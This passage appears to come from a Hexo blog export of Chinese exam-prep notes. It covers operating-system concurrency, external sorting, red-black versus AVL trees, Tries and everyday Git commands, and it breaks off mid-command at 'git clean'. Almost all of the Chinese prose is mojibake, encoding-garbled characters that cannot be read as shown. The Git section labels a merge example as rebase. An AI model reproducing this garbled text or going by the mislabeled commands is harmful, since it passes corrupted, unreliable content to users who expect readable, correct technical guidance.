    <content><![CDATA[<h1 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h1><h3 id="å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§å’Œå¹¶è¡Œæ€§"><a href="#å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§å’Œå¹¶è¡Œæ€§" class="headerlink" title="å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§å’Œå¹¶è¡Œæ€§"></a>å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§å’Œå¹¶è¡Œæ€§</h3><p>å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿä¸­ï¼Œcpuä¸å¤–éƒ¨è®¾å¤‡å¹¶è¡Œå·¥ä½œï¼Œcpuä¸å†…å­˜å¹¶å‘å·¥ä½œã€‚æ‰€ä»¥è¯´ä»–æœ‰å¹¶å‘å’Œå¹¶è¡Œçš„ç‰¹ç‚¹ã€‚</p>
<p>è¦æ³¨æ„åŒºåˆ†ä¸åŒè¯­å¢ƒä¸‹â€œå¹¶è¡Œâ€æ‰€æè¿°çš„å¯¹è±¡ã€‚</p>
<p>åœ¨è¯´æ˜æ“ä½œç³»ç»Ÿç‰¹ç‚¹æ—¶ï¼Œæˆ‘ä»¬è¯´ï¼Œå•CPUçš„æ“ä½œç³»ç»Ÿå…·æœ‰å¹¶å‘æ€§è€Œä¸å…·æœ‰å¹¶è¡Œæ€§ï¼Œåœ¨è¿™é‡Œï¼Œâ€œå¹¶è¡Œâ€æè¿°çš„æ˜¯è¿›ç¨‹ä¹‹é—´çš„å…³ç³»ï¼Œå•CPUæ“ä½œç³»ç»Ÿæ— æ³•çœŸæ­£åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œè€Œåªèƒ½ä»å¾®è§‚ä¸Šåˆ†æ—¶äº¤æ›¿åœ°è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œç¬¦åˆå¹¶å‘å´ç§°ä¸ä¸Šå¹¶è¡Œã€‚</p>
<p>è€Œè¿™é‡Œåœ¨è¯´æ˜å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿçš„ç‰¹ç‚¹æ—¶ï¼Œâ€œå¹¶è¡Œâ€æŒ‡çš„æ˜¯å¤šä¸ªä»»åŠ¡çš„å…³ç³»è€Œéå¤šä¸ªè¿›ç¨‹çš„å…³ç³»ã€‚è™½ç„¶å¤šè¿›ç¨‹åœ¨å•CPUç³»ç»Ÿæ— æ³•å¹¶è¡Œï¼Œä½†æ˜¯å¤šä»»åŠ¡å´å¯ä»¥ï¼Œæ¯”å¦‚ï¼Œä»»åŠ¡Aæ˜¯æ‰§è¡Œç®—æœ¯è¿ç®—ï¼Œå®ƒå ç”¨CPUï¼Œä»»åŠ¡Bæ˜¯æ‰§è¡ŒI&#x2F;Oï¼Œå®ƒä¸å ç”¨CPUï¼Œå› æ­¤è¿™ä¸¤ä¸ªä»»åŠ¡æ˜¯å¯ä»¥å¹¶è¡Œçš„ï¼Œæ­¤å³å•CPUå¤šä»»åŠ¡æ“ä½œç³»ç»Ÿçš„å¹¶è¡Œæ€§ã€‚</p>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>è€ƒç ”</tag>
        <tag>408</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®ç»“æ„</title>
    <url>/2021/12/21/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h1><h2 id="å¤–éƒ¨æ’åº"><a href="#å¤–éƒ¨æ’åº" class="headerlink" title="å¤–éƒ¨æ’åº"></a>å¤–éƒ¨æ’åº</h2><p><a href="https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0</a></p>
<h3 id="å¤šè·¯å½’å¹¶æ’åº"><a href="#å¤šè·¯å½’å¹¶æ’åº" class="headerlink" title="å¤šè·¯å½’å¹¶æ’åº"></a>å¤šè·¯å½’å¹¶æ’åº</h3><p>å¤–éƒ¨æ’åºæŒ‡çš„æ˜¯å¤§æ–‡ä»¶çš„æ’åºï¼Œå³å¾…æ’åºçš„è®°å½•å­˜å‚¨åœ¨å¤–å­˜å‚¨å™¨ä¸Šï¼Œå¾…æ’åºçš„æ–‡ä»¶æ— æ³•ä¸€æ¬¡è£…å…¥å†…å­˜ï¼Œéœ€è¦åœ¨å†…å­˜å’Œå¤–éƒ¨å­˜å‚¨å™¨ä¹‹é—´è¿›è¡Œå¤šæ¬¡æ•°æ®äº¤æ¢ï¼Œä»¥è¾¾åˆ°æ’åº æ•´ä¸ªæ–‡ä»¶çš„ç›®çš„ã€‚å¤–éƒ¨æ’åºæœ€å¸¸ç”¨çš„ç®—æ³•æ˜¯å¤šè·¯å½’å¹¶æ’åºï¼Œå³å°†åŸæ–‡ä»¶åˆ†è§£æˆå¤šä¸ªèƒ½å¤Ÿä¸€æ¬¡æ€§è£…å…¥å†…å­˜çš„éƒ¨åˆ†ï¼Œåˆ†åˆ«æŠŠæ¯ä¸€éƒ¨åˆ†è°ƒå…¥å†…å­˜å®Œæˆæ’åºã€‚ç„¶åï¼Œå¯¹å·²ç»æ’åºçš„å­æ–‡ä»¶è¿›è¡Œå¤šè·¯å½’å¹¶æ’åºã€‚</p>
<p>ç¼ºç‚¹ï¼šæ¯ä¸ªæ•°å­—éœ€è¦ä¸¤æ¬¡ioï¼Œäºæ˜¯å°±æœ‰äº†é€‰æ‹©ç½®æ¢æ’åºæ¥å‡å°‘io</p>
<p>é¢˜ç›®ï¼š</p>
<p>è‹¥å¤–éƒ¨å­˜å‚¨ä¸Šæœ‰3110400ä¸ªè®°å½•ï¼Œåš6è·¯å¹³è¡¡å½’å¹¶æ’åºï¼Œè®¡ç®—æœºå†…å­˜å·¥ä½œåŒºèƒ½å®¹çº³400ä¸ªè®°å½•ï¼Œåˆ™æ’åºå¥½æ‰€æœ‰è®°å½•ï¼Œéœ€è¦ä½œå‡ è¶Ÿå½’å¹¶æ’åºï¼ˆ ï¼‰</p>
<p>ç­”æ¡ˆï¼š5</p>
<p>log(6,3110400&#x2F;400) &#x3D; 5</p>
<h3 id="é€‰æ‹©ç½®æ¢æ’åºï¼ˆç”¨æ¥æ„é€ åˆå§‹å½’å¹¶æ®µï¼‰"><a href="#é€‰æ‹©ç½®æ¢æ’åºï¼ˆç”¨æ¥æ„é€ åˆå§‹å½’å¹¶æ®µï¼‰" class="headerlink" title="é€‰æ‹©ç½®æ¢æ’åºï¼ˆç”¨æ¥æ„é€ åˆå§‹å½’å¹¶æ®µï¼‰"></a>é€‰æ‹©ç½®æ¢æ’åºï¼ˆç”¨æ¥æ„é€ åˆå§‹å½’å¹¶æ®µï¼‰</h3><ul>
<li>å…ˆå°†å†…å­˜æ”¾æ»¡ï¼Œç„¶åå–å‡ºä¸€ä¸ªæœ€å°çš„ï¼Œæ¥ç€ä»å¤–å­˜ä¸­æ”¾å…¥ä¸€ä¸ªï¼Œç„¶åå†å–å‡ºä¸€ä¸ªæœ€å°çš„ï¼ˆå¯ä»¥è€ƒè™‘ç”¨å †æ’åºï¼‰</li>
<li>ç›´åˆ°å†…å­˜ä¸­æœ€å°çš„æ¯”å¤–å­˜ä¸­æœ€å¤§çš„å°ï¼Œç„¶åå°±æŠŠå†…å­˜ä¸­è¿™ä¸ªæ ‡è®°ä¸€ä¸‹ï¼Œç»§ç»­å–ç¬¬äºŒå°çš„ï¼Œç›´åˆ°å†…å­˜ä¸­æœ€å¤§çš„æ¯”å¤–å­˜ä¸­æœ€å¤§çš„å°ï¼Œä¸€è¶Ÿæ’åºç»“æŸï¼Œæ­¤æ—¶å¤–å­˜çš„ä¸ºåˆå§‹å½’å¹¶æ®µï¼Œç›¸æ¯”äºå¤šè·¯å½’å¹¶æ’åºæ¥è¯´ï¼Œè¿™ä¸ªé€‰å½’å¹¶æ®µçœå»äº†å¤šæ¬¡ioã€‚</li>
<li>æ¥ç€å’Œä¹‹å‰ä¸€æ ·çš„æ­¥éª¤ï¼Œæœ€åä¼šå¾—åˆ°å¤šä¸ªå½’å¹¶æ®µ</li>
<li>ç„¶åä½¿ç”¨å¤šè·¯å½’å¹¶æ’åºæ¥æ’åº</li>
</ul>
<p>ç¼ºç‚¹ï¼šå½’å¹¶æ®µçš„é•¿åº¦ä¸ä¸€è‡´ï¼Œ æ€ä¹ˆé€‰æ‹©å½’å¹¶æ®µä¼šå½±å“ioæ¬¡æ•°ï¼Œäºæ˜¯å°±æœ‰äº†æœ€ä½³å½’å¹¶æ•°æ¥é€‰æ‹©æœ€ä½³çš„å½’å¹¶åºåˆ—</p>
<h3 id="æœ€ä½³å½’å¹¶æ ‘"><a href="#æœ€ä½³å½’å¹¶æ ‘" class="headerlink" title="æœ€ä½³å½’å¹¶æ ‘"></a>æœ€ä½³å½’å¹¶æ ‘</h3><p>ç±»ä¼¼äºå“ˆå¤«æ›¼æ ‘</p>
<h3 id="è´¥è€…æ ‘"><a href="#è´¥è€…æ ‘" class="headerlink" title="è´¥è€…æ ‘"></a>è´¥è€…æ ‘</h3><p>åœ¨å†…å­˜ä¸­çš„æ•°é€‰å‡ºä¸€ä¸ªæœ€å°çš„ï¼ˆé¢‘ç¹æ‰§è¡Œï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å †ï¼Œä½†æ˜¯è´¥è€…æ ‘æ›´å¥½ç”¨ã€‚</p>
<p>ç”¨å †çš„è¯æ¯æ¬¡è°ƒæ•´ä¹‹åä¸å¥½è®°å½•è¿™ä¸ªæ•°æ˜¯èˆ’æœå‡ ä¸ªå½’å¹¶æ®µçš„ï¼Œè€Œè´¥è€…æ ‘ä¸ä¼šã€‚</p>
<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><h3 id="çº¢é»‘æ ‘ï¼ˆRB-treeï¼‰æ¯”AVLæ ‘çš„ä¼˜åŠ¿åœ¨å“ªï¼Ÿ"><a href="#çº¢é»‘æ ‘ï¼ˆRB-treeï¼‰æ¯”AVLæ ‘çš„ä¼˜åŠ¿åœ¨å“ªï¼Ÿ" class="headerlink" title="çº¢é»‘æ ‘ï¼ˆRB-treeï¼‰æ¯”AVLæ ‘çš„ä¼˜åŠ¿åœ¨å“ªï¼Ÿ"></a>çº¢é»‘æ ‘ï¼ˆRB-treeï¼‰æ¯”AVLæ ‘çš„ä¼˜åŠ¿åœ¨å“ªï¼Ÿ</h3><p>çº¢é»‘æ ‘çš„ç‰¹æ€§:<br>ï¼ˆ1ï¼‰æ¯ä¸ªèŠ‚ç‚¹æˆ–è€…æ˜¯é»‘è‰²ï¼Œæˆ–è€…æ˜¯çº¢è‰²ã€‚<br>ï¼ˆ2ï¼‰æ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²ã€‚<br>ï¼ˆ3ï¼‰æ¯ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆNILï¼‰æ˜¯é»‘è‰²ã€‚ [æ³¨æ„ï¼šè¿™é‡Œå¶å­èŠ‚ç‚¹ï¼Œæ˜¯æŒ‡ä¸ºç©º(NILæˆ–NULL)çš„å¶å­èŠ‚ç‚¹ï¼]<br>ï¼ˆ4ï¼‰å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ˜¯çº¢è‰²çš„ï¼Œåˆ™å®ƒçš„å­èŠ‚ç‚¹å¿…é¡»æ˜¯é»‘è‰²çš„ã€‚<br>ï¼ˆ5ï¼‰ä»ä¸€ä¸ªèŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹çš„å­å­™èŠ‚ç‚¹çš„æ‰€æœ‰è·¯å¾„ä¸ŠåŒ…å«ç›¸åŒæ•°ç›®çš„é»‘èŠ‚ç‚¹ã€‚</p>
<p>å®šç†ï¼š<strong>ä¸€æ£µå«æœ‰nä¸ªèŠ‚ç‚¹çš„çº¢é»‘æ ‘çš„é«˜åº¦è‡³å¤šä¸º2log(n+1)</strong>.</p>
<p>é¦–å…ˆçº¢é»‘æ ‘æ˜¯ä¸ç¬¦åˆAVLæ ‘çš„å¹³è¡¡æ¡ä»¶çš„ï¼Œå³æ¯ä¸ªèŠ‚ç‚¹çš„å·¦å­æ ‘å’Œå³å­æ ‘çš„é«˜åº¦æœ€å¤šå·®1çš„äºŒå‰æŸ¥æ‰¾æ ‘ã€‚ä½†æ˜¯æå‡ºäº†ä¸ºèŠ‚ç‚¹å¢åŠ é¢œè‰²ï¼Œçº¢é»‘æ˜¯ç”¨éä¸¥æ ¼çš„å¹³è¡¡æ¥æ¢å–å¢åˆ èŠ‚ç‚¹æ—¶å€™æ—‹è½¬æ¬¡æ•°çš„é™ä½ï¼Œä»»ä½•ä¸å¹³è¡¡éƒ½ä¼šåœ¨ä¸‰æ¬¡æ—‹è½¬ä¹‹å†…è§£å†³ï¼Œè€ŒAVLæ˜¯ä¸¥æ ¼å¹³è¡¡æ ‘ï¼Œå› æ­¤åœ¨å¢åŠ æˆ–è€…åˆ é™¤èŠ‚ç‚¹çš„æ—¶å€™ï¼Œæ ¹æ®ä¸åŒæƒ…å†µï¼Œæ—‹è½¬çš„æ¬¡æ•°æ¯”çº¢é»‘æ ‘è¦å¤šã€‚æ‰€ä»¥çº¢é»‘æ ‘çš„æ’å…¥æ•ˆç‡æ›´é«˜ï¼ï¼ï¼</p>
<p>çº¢é»‘æ ‘çš„æŸ¥è¯¢æ€§èƒ½ç•¥å¾®é€Šè‰²äºAVLæ ‘ï¼Œå› ä¸ºä»–æ¯”avlæ ‘ä¼šç¨å¾®ä¸å¹³è¡¡æœ€å¤šå¤šä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯è¯´çº¢é»‘æ ‘çš„æŸ¥è¯¢æ€§èƒ½åªæ¯”ç›¸åŒå†…å®¹çš„avlæ ‘æœ€å¤šå¤šä¸€æ¬¡æ¯”è¾ƒï¼Œä½†æ˜¯ï¼Œçº¢é»‘æ ‘åœ¨æ’å…¥å’Œåˆ é™¤ä¸Šå®Œçˆ†avlæ ‘ï¼Œ avlæ ‘æ¯æ¬¡æ’å…¥åˆ é™¤ä¼šè¿›è¡Œå¤§é‡çš„å¹³è¡¡åº¦è®¡ç®—ï¼Œè€Œçº¢é»‘æ ‘ä¸ºäº†ç»´æŒçº¢é»‘æ€§è´¨æ‰€åšçš„çº¢é»‘å˜æ¢å’Œæ—‹è½¬çš„å¼€é”€ï¼Œç›¸è¾ƒäºavlæ ‘ä¸ºäº†ç»´æŒå¹³è¡¡çš„å¼€é”€è¦å°å¾—å¤š </p>
<p>æ‰€ä»¥ç®€å•è¯´ï¼Œå¦‚æœä½ çš„åº”ç”¨ä¸­ï¼Œæœç´¢çš„æ¬¡æ•°è¿œè¿œå¤§äºæ’å…¥å’Œåˆ é™¤ï¼Œé‚£ä¹ˆé€‰æ‹©AVLï¼Œå¦‚æœæœç´¢ï¼Œæ’å…¥åˆ é™¤æ¬¡æ•°å‡ ä¹å·®ä¸å¤šï¼Œåº”è¯¥é€‰æ‹©RBã€‚</p>
<h3 id="é¢è¯•ä¹‹Trieæ ‘ç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯"><a href="#é¢è¯•ä¹‹Trieæ ‘ç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯" class="headerlink" title="é¢è¯•ä¹‹Trieæ ‘ç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯"></a>é¢è¯•ä¹‹Trieæ ‘ç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯</h3><p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li><p>Trieè¿›è¡Œå¯¹æŸä¸ªstringæŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(m)ï¼Œmä¸ºstringä¸­å­—ç¬¦ä¸ªæ•°ã€‚ç›¸æ¯”è¾ƒï¼ŒBSTï¼ˆäºŒå‰æœç´¢æ ‘ï¼‰çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(logNï¼‰ï¼Œåœ¨æ ‘ä¸å¹³è¡¡çš„æƒ…å†µä¸‹ï¼Œä¸ºO(N)ï¼›</p>
</li>
<li><p>åˆ©ç”¨å­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€æ¥å‡å°‘æŸ¥è¯¢æ—¶é—´ï¼Œæœ€å¤§é™åº¦çš„å‡å°‘æ— è°“çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼ŒæŸ¥è¯¢æ•ˆç‡æ¯”å“ˆå¸Œæ ‘é«˜ã€‚</p>
</li>
<li><p>Trieå¯ä»¥ç”Ÿæˆä»¥å­—æ¯é¡ºåºæ’åºçš„é”®å€¼å¯¹é›†åˆ</p>
</li>
<li><p>è‡ªå¸¦æ’åºåŠŸèƒ½</p>
</li>
</ol>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li><p>Trieåœ¨æœç´¢æ•ˆç‡ä¸Šå¯èƒ½ä¼šæ¯”Hashæ…¢ã€‚</p>
</li>
<li><p>æœ‰äº›é”®ï¼ˆkeyï¼‰ï¼Œä¾‹å¦‚æµ®ç‚¹æ•°ï¼Œæœ‰å¾ˆé•¿çš„å‰åºèŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å†…å­˜è¿‡å¤§æˆ–è€…æœç´¢æ•ˆç‡ä¸‹é™ã€‚è™½ç„¶bitwise trieå¯ä»¥å¤„ç†è¿™ç§æƒ…å†µï¼Œä½†éœ€è¦é’ˆå¯¹ç‰¹å®šçš„æƒ…å¢ƒç¼–å†™å¤šä½™çš„ä»£ç ã€‚</p>
</li>
<li><p>åœ¨ç©ºé—´å¤æ‚åº¦ä¸Šï¼ŒTrieçš„å¼€é”€å¯èƒ½ä¼šå¤šäºHashtableç”³è¯·çš„å†…å­˜ã€‚Trieçš„æ¯ä¸€ä¸ªèŠ‚ç‚¹å¯èƒ½ä¼šæœ‰å¤šä¸ªå­©å­ï¼ˆä¾‹å¦‚æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šå¯èƒ½æœ‰a-z 26ä¸ªå­©å­ï¼‰ï¼Œè¿™ä¸ªå¤šå±‚çš„Trieå¯¹å†…å­˜å¼€é”€å¾ˆå¤§ã€‚</p>
</li>
</ol>
<p>Trieçš„åº”ç”¨åœºæ™¯</p>
<ol>
<li><p>ä¿å­˜ä¸€æœ¬å­—å…¸ï¼Œè‹±æ–‡å­—å…¸å¤§çº¦åªæœ‰50,000ä¸ªå•è¯ï¼Œå¹¶ä¸”Trieè¿˜æ¼”åŒ–å‡ºæ¥ä¸€ç§å«åš<a href="http://en.wikipedia.org/wiki/Directed_acyclic_word_graph">Directed acyclic word graph</a>çš„ä¸œè¥¿ï¼Œå®ƒå°†åç¼€ä¸€æ ·çš„å­—ç¬¦ä¸²ä¹Ÿè¿›è¡Œäº†å‹ç¼©ï¼Œæ‰€ä»¥ç©ºé—´åˆ©ç”¨ç‡æœ‰äº†è¿›ä¸€æ­¥æé«˜ã€‚æ‰€ä»¥Trieåœ¨ç©ºé—´åˆ©ç”¨ç‡ä¸Šä¸ä¼šæ¯”Binary Search Treeå·®å¤ªå¤šã€‚</p>
</li>
<li><p>æ ¹æ®ä¿å­˜çš„å­—å…¸ï¼Œå¯ä»¥é¢„æµ‹ç”¨æˆ·è¾“å…¥å†…å®¹</p>
</li>
<li><p>æ–­è¯å’Œæ‹¼å†™æŸ¥é”™è½¯ä»¶ä¹Ÿè¿ç”¨äº†Trie â€“ spellings&#x2F;suggestions&#x2F;type-ahead-lookup&#x2F;auto-completion&#x2F;<br>è¿™äº›åº”ç”¨åœºæ™¯éƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯ä¸æ˜¯å•ç‹¬åœ°æŸ¥è¯¢ä¸€ä¸ªè¯ï¼Œè€Œæ˜¯è·å–ä»¥æœ‰ä¸€å®šå­—æ¯é¡ºåºçš„ä¸€ç»„å­—ç¬¦ä¸²</p>
</li>
</ol>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>æ•°æ®ç»“æ„</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨å‘½ä»¤</title>
    <url>/2021/12/21/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p><a href="https://learngitbranching.js.org/?locale=zh_CN">Gitå­¦ä¹ ç½‘ç«™</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">å°†æœ¬åœ°é¡¹ç›®æ¨é€åˆ°github</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;init commit&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å°†æœ¬åœ°é¡¹ç›®ä¸è¿œç¨‹ä»“åº“å…³è”</span></span><br><span class="line">git remote add origin https://github.com/HuangMingwang/test.git</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¬¬ä¸€æ¬¡æäº¤éœ€è¦-uï¼Œè¯¥-uæ ‡å¿—æ·»åŠ äº†å¯¹æ‚¨æ¨é€åˆ°çš„ä¸Šæ¸¸æœåŠ¡å™¨çš„è·Ÿè¸ªå¼•ç”¨ã€‚</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸€æ—¦ä½ åšäº†ä¸€ä¸ªgit push -u origin masterï¼Œä½ å¯ä»¥ç¨åè°ƒç”¨git pullï¼Œgit å°±ä¼šçŸ¥é“ä½ å®é™…ä¸Šæ˜¯æŒ‡git pull origin master.</span></span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹è¿œç¨‹ä»“åº“åœ°å€</span></span><br><span class="line">git remote -v</span><br><span class="line"><span class="meta"># </span><span class="language-bash">http ä¸sshäº’è½¬</span></span><br><span class="line">git remote set-url origin https://xxxxxxx.git</span><br><span class="line">git remote set-url origin git@git.xxxxx.git</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªæ–°çš„ç‰ˆæœ¬åº“</span></span><br><span class="line">git clone https://git.woa.com/mingwhuang/mybatisplus-demo.git</span><br><span class="line">cd mybatisplus-demo</span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;add README&quot;</span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">git checkout -b test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹çŠ¶æ€</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å†å²</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä½¿ç”¨mergeåˆå¹¶</span></span><br><span class="line">git merge test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä½¿ç”¨rebaseåˆå¹¶</span></span><br><span class="line">git checkout test</span><br><span class="line">git merge test</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰“tag</span></span><br><span class="line">git tag v1.0</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹tag</span></span><br><span class="line">git tag</span><br><span class="line">git push origin v1.0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å›é€€æš‚å­˜åŒºçš„å†…å®¹åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬ï¼Œå·²ç»addçš„ä¼šå˜æˆæ²¡æœ‰addçš„çŠ¶æ€ï¼Œå·¥ä½œåŒºå†…å®¹ä¸å˜</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^ ä¸Šä¸€ä¸ªç‰ˆæœ¬</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^^ ä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">HEAD^^^ ä¸Šä¸Šä¸Šä¸€ä¸ªç‰ˆæœ¬</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿™ä¸ªå‘½ä»¤ä»…æ”¹å˜æš‚å­˜åŒºï¼Œå¹¶ä¸æ”¹å˜å·¥ä½œåŒºï¼Œè¿™æ„å‘³ç€åœ¨æ— ä»»ä½•å…¶ä»–æ“ä½œçš„æƒ…å†µä¸‹ï¼Œå·¥ä½œåŒºä¸­çš„å®é™…æ–‡ä»¶åŒè¯¥å‘½ä»¤è¿è¡Œä¹‹å‰æ— ä»»ä½•å˜åŒ–</span></span><br><span class="line">git reset HEAD^  </span><br><span class="line"><span class="meta"># </span><span class="language-bash">å›é€€hello.php æ–‡ä»¶çš„ç‰ˆæœ¬åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬</span>  </span><br><span class="line">git reset HEAD^ hello.php  </span><br><span class="line"><span class="meta"># </span><span class="language-bash">å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬</span></span><br><span class="line">git reset 052e(å“ˆå¸Œå€¼) </span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¾€å‰å›é€€ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¹¶ä¸”å°†è¿™æ¬¡é”™è¯¯çš„æäº¤çš„ä»£ç æ”¹åŠ¨ï¼Œæ”¾åœ¨å·¥ä½œåŒºé‡Œã€‚ï¼ˆå’Œä¸å¸¦å‚æ•°æ˜¯ä¸€æ ·çš„ï¼‰</span></span><br><span class="line">git reset --mixed HEAD^</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å·¥ä½œåŒºï¼šå³è‡ªå·±å½“å‰åˆ†æ”¯æ‰€ä¿®æ”¹çš„ä»£ç ï¼Œgit add xx ä¹‹å‰çš„ï¼ä¸åŒ…æ‹¬ git add xx å’Œ git commit xxx ä¹‹åçš„ã€‚</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿”å›åˆ°æŸä¸ªèŠ‚ç‚¹ï¼Œå›é€€å®Œäº†åå·¥ä½œåŒºå°±æ˜¯ä¸Šä¸€ä¸ªç‰ˆæœ¬çš„ä»£ç äº†ï¼Œå¹¶ä¸”æ˜¯cleançš„ï¼Œåªä¼šå›é€€å·²ç»addåˆ°æ–‡ä»¶ç¼“å­˜åŒºï¼ˆæš‚å­˜åŒºï¼‰çš„å†…å®¹ï¼ˆåŒ…æ‹¬æ–°å¢çš„æ–‡ä»¶ï¼‰</span></span><br><span class="line">git reset --hard HASH</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¾€å‰å›é€€ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¹¶ä¸”å°†è¿™æ¬¡é”™è¯¯çš„æäº¤çš„ä»£ç æ”¹åŠ¨ï¼Œæ”¾åœ¨æš‚å­˜åŒºé‡Œã€‚</span></span><br><span class="line">git reset --soft HASH </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ’¤é”€å¯¹æ‰€æœ‰å·²ä¿®æ”¹å¹¶ä¸”å·²ç»addåˆ°æš‚å­˜åŒºä½†æœªæäº¤çš„æ–‡ä»¶çš„ä¿®æ”¹ï¼Œä½†ä¸åŒ…æ‹¬æ–°å¢çš„æ–‡ä»¶,æ–°å¢çš„æ–‡ä»¶å†…å®¹éƒ½ä¸ä¼šå˜</span></span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ’¤é”€å¯¹æŒ‡å®šæ–‡ä»¶çš„ä¿®æ”¹ï¼Œ[filename]ä¸ºæ–‡ä»¶å</span></span><br><span class="line">git checkout [filename] </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ˜¯ä¸€æ¬¡cleançš„æ¼”ä¹ , å‘Šè¯‰ä½ å“ªäº›æ–‡ä»¶ä¼šè¢«åˆ é™¤. è®°ä½ä»–ä¸ä¼šçœŸæ­£çš„åˆ é™¤æ–‡ä»¶, åªæ˜¯ä¸€ä¸ªæé†’</span></span><br><span class="line">git clean -n</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ²¡æœ‰trackè¿‡çš„æ–‡ä»¶ï¼Œä¸ä¼šåˆ é™¤æ–°å»ºçš„æ–‡ä»¶é‡Œé¢çš„æ–‡ä»¶ï¼Œä»–ä¸ä¼šåˆ é™¤.gitignoreæ–‡ä»¶é‡Œé¢æŒ‡å®šçš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶, ä¸ç®¡è¿™äº›æ–‡ä»¶æœ‰æ²¡æœ‰è¢«trackè¿‡</span></span><br><span class="line">git clean 